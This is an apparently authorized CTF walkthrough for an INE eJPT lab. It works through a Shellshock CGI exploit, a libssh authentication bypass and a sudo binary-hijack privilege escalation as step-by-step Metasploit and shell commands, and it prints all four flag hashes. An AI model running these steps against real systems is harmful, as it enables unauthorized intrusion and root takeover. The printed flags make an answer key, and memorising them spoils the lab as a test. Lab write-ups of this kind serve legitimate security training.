# INE eJPT — Host & Network Penetration Testing: System-Host Based Attacks CTF 2

**Course:** INE / eJPT — Host & Network Penetration Testing  
**Lab:** System-Host Based Attacks CTF 2  
**Author:** Zeliha Zengin

---

## Lab Environment

GUI access to a Kali machine is provided. Two targets: `target1.ine.local` and `target2.ine.local`.

- **Flag 1:** Check the root (`/`) directory on `target1`.
- **Flag 2:** Explore `/opt/apache/htdocs/` on `target1` — the file's name begins with a dot.
- **Flag 3:** Investigate the user's home on `target2` (use the `libssh_auth_bypass` module).
- **Flag 4:** Look in `/root` on `target2`.

> **Note:** Flag format is `FLAG#_<MD5>` — submit only the hash, without the prefix or underscore.

**Tools used:** Nmap · Burp Suite · Metasploit

> *All work is performed against an authorized INE training lab for eJPT exam preparation.*

## Flag 1 — Shellshock via a CGI script on target1

Scan the target and enumerate the web root. The `/cgi-bin/` directory holds executables; `browser.cgi` is the interesting one:

```bash
cat /etc/hosts
nmap -sV -sC -p- -Pn -A target1.ine.local
dirb http://target1.ine.local
```

Exploit the CGI with the Shellshock module (find your `LHOST` with `ip a`):

```bash
msfconsole -q
search Shellshock
use 1
show options
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
set LHOST <your-ip>
run
```

Once the session opens, read the flag from `/`:

```bash
getuid
sysinfo
cd /
ls
cat flag.txt
```

> **Note:** An Apache `cgi-bin` RCE module (`search Apache cgi-bin`) is a viable alternative to the dedicated Shellshock module.

> 🏁 **FLAG 1:** `035713a7bba1436f9ad95e2f39e2856d`

## Flag 2 — Hidden file in the web root

List `/opt/apache/htdocs/` including dotfiles — the flag lives in a file whose name starts with a dot:

```bash
ls -la /opt/apache/htdocs/
cat /opt/apache/htdocs/.flag.txt
```

> 🏁 **FLAG 2:** `1358180f3b6349b49e211b87977d95a3`

## Flag 3 — libssh authentication bypass on target2

Nmap shows SSH running on **libssh**, which is vulnerable to an authentication bypass. Use the Metasploit module, set `SPAWN_PTY`, and interact with the session:

```bash
nmap -sV -p- -Pn -A target2.ine.local
msfconsole
search libssh_auth_bypass
use 0
set RHOSTS target2.ine.local
set SPAWN_PTY true
run
sessions
sessions -i 1
```

Read the flag from the user's home directory:

```bash
cd /home/user
ls
cat flag.txt
```

> 🏁 **FLAG 3:** `5b4ad5b2d81e44ceb7b32acbc149ad65`

## Flag 4 — Privilege escalation via sudo binary hijack

`/root` contains two binaries: `welcome` and `greetings`. `welcome` runs `greetings` with elevated (sudo) privileges — a classic hijack. Trace it, then replace `greetings` with a copy of `bash`:

```bash
cd /root
ls -la
strace ./welcome
rm greetings
cp /bin/bash greetings
./welcome
```

Running `welcome` now executes your `bash` as root. Read the flag:

```bash
cd /root
cat flag.txt
```

> 🏁 **FLAG 4:** `fe647ae475074f94919ebe90a5183c8d`

## Summary

| Flag | Target | Technique |
| --- | --- | --- |
| 1 | target1 | Shellshock RCE on `browser.cgi` → read `/flag.txt` |
| 2 | target1 | Hidden dotfile in `/opt/apache/htdocs/` |
| 3 | target2 | libssh authentication bypass → `/home/user` |
| 4 | target2 | sudo binary hijack (replace `greetings` with `bash`) |

### Key Takeaways

- A `.cgi` script under `/cgi-bin/` is a prime Shellshock candidate — test it early.
- Always list with `-la`; flags are often hidden dotfiles.
- An SSH service built on vulnerable libssh can be bypassed outright — fingerprint the SSH stack, not just the port.
- A privileged program that calls a relative/overwritable helper (`strace` reveals it) is a reliable privesc.

---

*Write-up by Zeliha Zengin · eJPT preparation*